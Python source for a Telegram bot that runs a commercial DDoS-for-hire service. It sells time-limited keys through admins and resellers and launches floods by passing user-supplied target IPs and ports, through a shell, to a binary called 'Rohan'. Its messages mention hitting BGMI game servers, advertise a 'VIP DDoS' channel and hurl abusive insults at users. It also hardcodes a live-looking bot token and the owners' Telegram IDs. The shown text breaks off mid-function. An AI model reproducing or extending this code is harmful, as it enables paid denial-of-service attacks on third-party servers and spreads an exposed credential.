import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import shutil
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('8147615549:AAGW6usLYzRZzaNiDf2b0NEDM0ZaVa6qZ7E')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session  # Attach the session with retries to the bot

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames (loaded from file)
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
MAX_BACKUPS = 5

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}  # Stores user_id: {expiration, context}
keys = {}   # Stores key: {duration, device_limit, devices, blocked, context}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0  # Cooldown removed as per March 05, 2025
resellers = {}

# Stats tracking
bot_start_time = datetime.datetime.now(IST)  # For uptime calculation
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],  # Changed from set() to list
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0
    }
}

# Compulsory message with enhanced UI
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔥 **SCAM ALERT!** 🔥\n"
    "Agar koi bhi Rahul DDoS bot ka key **kisi aur se** kharidta hai, toh kisi bhi scam ka **koi responsibility nahi**! 😡\n"
    "✅ **Sirf @Rahul_618** se key lo – yeh hai **Trusted Dealer**! 💎\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames, stats
    initialize_system()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    for uid, info in list(data.items()):
                        try:
                            exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            if datetime.datetime.now(IST) > exp_date:
                                del data[uid]
                                stats["expired_keys"] += 1
                            else:
                                data[uid] = info
                                stats["total_users"].add(uid)
                        except (ValueError, KeyError):
                            del data[uid]
                    if file == USER_FILE:
                        users = data
                    else:
                        authorized_users = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                        del keys_data[key_name]
                        stats["expired_keys"] += 1
                    else:
                        keys_data[key_name] = key_info
                        stats["total_keys"] += 1
                        stats["key_gen_timestamps"].append(generated_time)
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)
    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)
    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)
    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)
    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
    print("All data saved successfully.")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
        shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        escaped_text = formatting.escape_markdown(text_with_compulsory)
        bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            escaped_text = formatting.escape_markdown(append_compulsory_message(text))
            bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Stats utility functions
def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 300]
    return len(stats["active_users"])

# Live Stats Dashboard for Overlord
def live_stats_update(chat_id, message_id):
    while True:
        active_users = update_active_users()
        active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
        command_usage_str = "\n".join([f"📜 **/{cmd}**: __{count}__" for cmd, count in stats["command_usage"].items()])
        memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02  # Simulated memory usage in MB
        response = (
            f"🌌 **COSMIC LIVE STATS (OVERLORD)** 🌌\n"
            f"🔥 **Bhai Overlord, ye hai live data!** 🔥\n"
            f"🔑 **Total Keys:** __{stats['total_keys']}__\n"
            f"💥 **Active Attacks:** __{stats['active_attacks']}__\n"
            f"👥 **Total Users:** __{len(stats['total_users'])}__\n"
            f"👤 **Active Users (Last 5 min):** __{active_users}__\n"
            f"🔑 **Keys Generated/min:** __{calculate_keys_per_minute()}__\n"
            f"🔓 **Total Redeemed Keys:** __{stats['redeemed_keys']}__\n"
            f"⏳ **Bot Uptime:** __{calculate_uptime()}__\n"
            f"💥 **Total Attacks Launched:** __{stats['total_attacks']}__\n"
            f"⏱️ **Avg Attack Duration:** __{calculate_avg_attack_duration()}__\n"
            f"❌ **Total Expired Keys:** __{stats['expired_keys']}__\n"
            f"🔑 **Active Keys:** __{active_keys}__\n"
            f"👥 **Peak Active Users:** __{stats['peak_active_users']}__\n"
            f"⚙️ **Memory Usage (Simulated):** __{memory_usage:.2f}MB__\n"
            f"📊 **Command Usage Stats:**\n{command_usage_str}\n"
            f"📅 **Last Updated:** __{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}__\n"
            f"```\n"
            f"nebula> overlord_stats\n"
            f"status: RUNNING 🚀\n"
            f"```\n"
            f"⚡️ __Cosmic power unleashed!__ ⚡️\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            bot.edit_message_text(append_compulsory_message(response), chat_id, message_id, parse_mode="MarkdownV2")
        except telebot.apihelper.ApiTelegramException as e:
            log_error(f"Stats update error: {str(e)}", "system", "system")
            break
        time.sleep(10)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    if active_attacks.get(user_id, False):
        response = "🚫 BSDK, ruk ja warna gaand mar dunga teri! Ek attack chal raha hai, dusra mat try kar!" if not is_admin(user_id, username) else "👑 Kripya karke BGMI ko tazi sa na choda! Ek attack already chal raha hai, wait karo."
        safe_reply(bot, chat_id, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    try:
        packet_size = 512
        if packet_size < 1 or packet_size > 65507:
            response = "Error: Packet size must be between 1 and 65507"
            bot.send_message(chat_id, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        full_command = f"./Rohan {target} {port} {time} {packet_size} 1200"
        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 1200\nAttacker: @{username}\nJoin VIP DDoS: https://t.me/devil_ddos"
        bot.send_message(chat_id, formatting.escape_markdown(response), parse_mode='MarkdownV2')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: send_attack_finished_message(chat_id), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        active_attacks[user_id] = True
        stats["active_attacks"] += 1
        stats["total_attacks"] += 1
        stats["attack_durations"].append(time)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200", response)
    except Exception as e:
        response = f"Error executing attack: {str(e)}"
        bot.send_message(chat_id, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
            stats["active_attacks"] -= 1

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack completed")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "Bhai, ye sirf Overlord ka kaam hai! 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /addadmin <username_or_id>\nExample: /addadmin @user123 ya /addadmin 123456789 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        if target_username in admin_usernames:
            response = f"{target} pehle se hi admin hai! ✅"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        admin_usernames.add(target_username)
        response = f"Admin add ho gaya! 🎉\nUsername: {target}"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            if target_id in admin_id:
                response = f"User ID {target_id} pehle se hi admin hai! ✅"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            admin_id.add(target_id)
            response = f"Admin add ho gaya! 🎉\nUser ID: {target_id}"
        except ValueError:
            response = "Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Target: {target}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removeadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "Bhai, ye sirf Overlord ka kaam hai! 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /removeadmin <username_or_id>\nExample: /removeadmin @user123 ya /removeadmin 123456789 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "Overlord ko remove nahi kar sakte! 🚫"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        if target_username not in admin_usernames:
            response = f"{target} admin nahi hai! ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        admin_usernames.remove(target_username)
        response = f"Admin remove ho gaya! 🗑️\nUsername: {target}"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "Overlord ko remove nahi kar sakte! 🚫"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            if target_id not in admin_id:
                response = f"User ID {target_id} admin nahi hai! ❌"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            admin_id.remove(target_id)
            response = f"Admin remove ho gaya! 🗑️\nUser ID: {target_id}"
        except ValueError:
            response = "Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Target: {target}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = "=== ADMIN LIST BHAI ===\n"
    
    # Overlords
    response += "\n**Overlords**:\n"
    for oid in overlord_id:
        try:
            user_info = bot.get_chat(oid)
            user_name = user_info.username if user_info.username else user_info.first_name
            response += f"User ID: {oid}\nUsername: @{user_name}\nRole: Overlord 👑\n\n"
        except:
            response += f"User ID: {oid}\nUsername: Unknown\nRole: Overlord 👑\n\n"
    for uname in overlord_usernames:
        response += f"Username: {uname}\nUser ID: Unknown\nRole: Overlord 👑\n\n"
    
    # Admins
    response += "\n**Admins**:\n"
    if not admin_id and not admin_usernames:
        response += "No additional admins found.\n"
    else:
        for aid in admin_id:
            if aid not in overlord_id:  # Skip overlords
                try:
                    user_info = bot.get_chat(aid)
                    user_name = user_info.username if user_info.username else user_info.first_name
                    response += f"User ID: {aid}\nUsername: @{user_name}\nRole: Admin ✅\n\n"
                except:
                    response += f"User ID: {aid}\nUsername: Unknown\nRole: Admin ✅\n\n"
        for uname in admin_usernames:
            if uname not in overlord_usernames:  # Skip overlords
                response += f"Username: {uname}\nUser ID: Unknown\nRole: Admin ✅\n\n"
    
    response += "Buy key from @Rahul_618 🔑\nAny problem contact @Rahul_618 📩"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addreseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id not in admin_id and not is_overlord(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = "Usage: /addreseller <user_id> <balance> 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        initial_balance = int(command_parts[2])
    except ValueError:
        response = "Invalid balance amount ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_data()
        response = f"Reseller added successfully 🎉\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs 💰"
    else:
        response = f"Reseller {reseller_id} already exists ❌"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}, Balance: {initial_balance}", response)
    save_data()

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["genkey"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "Bhai, admin hi key bana sakta hai! 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    
    # Check if the user is an Overlord
    if is_overlord(user_id, username):
        if len(command_parts) < 4 or len(command_parts) > 5:
            response = "Usage for Overlord: /genkey <duration> [device_limit] <key_name> <context>\nExample: /genkey 1d 999 sadiq group or /genkey 1d all sadiq DM 📋"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        # Parse the command for Overlord
        duration = command_parts[1].lower()
        if len(command_parts) == 5:
            device_limit_input = command_parts[2].lower()
            key_name = command_parts[3]
            context = command_parts[4].lower()
        else:
            device_limit_input = "1"  # Default to 1 if not specified
            key_name = command_parts[2]
            context = command_parts[3].lower()
        
        # Parse device limit
        if device_limit_input == "all":
            device_limit = float('inf')  # Unlimited devices
        else:
            try:
                device_limit = int(device_limit_input)
                if device_limit < 1:
                    response = "Device limit must be at least 1! ❌"
                    safe_reply(bot, message, response)
                    log_action(user_id, username, "/genkey", f"Command: {command}", response)
                    return
            except ValueError:
                response = "Invalid device limit! Use a number or 'all'. ❌"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/genkey", f"Command: {command}", response)
                return
    else:
        # Non-Overlord (Admins and Resellers) format
        if len(command_parts) != 4 or command_parts[1].lower() != "key":
            response = "Usage for Admins/Resellers: /genkey key <duration> <key_name>\nExample: /genkey key 1d rahul\nNote: Only group keys allowed! 📋"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        duration = command_parts[2].lower()
        key_name = command_parts[3]
        context = 'group'  # Fixed to group for Admins/Resellers
        device_limit = 1  # Default device limit for non-Overlords

    # Validate context for Overlord
    if is_overlord(user_id, username):
        if context not in ['dm', 'group', 'groups']:
            response = "Invalid context! Use 'dm', 'group', or 'groups' (case-insensitive). ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        context = 'group' if context in ['group', 'groups'] else 'private'

    # Parse duration
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        response = "Invalid duration. Use formats like 30min, 1h, 1d, 1m ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    custom_key = f"Rahul_sadiq-{key_name}"
    generated_by = username or f"UserID_{user_id}"
    generated_time = datetime.datetime.now(IST)
    # If key exists, update it and unblock if previously blocked
    if custom_key in keys:
        was_blocked = keys[custom_key].get("blocked", False)
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": keys[custom_key].get("devices", []),
            "blocked": False,  # Unblock the key
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "updated"
        if was_blocked:
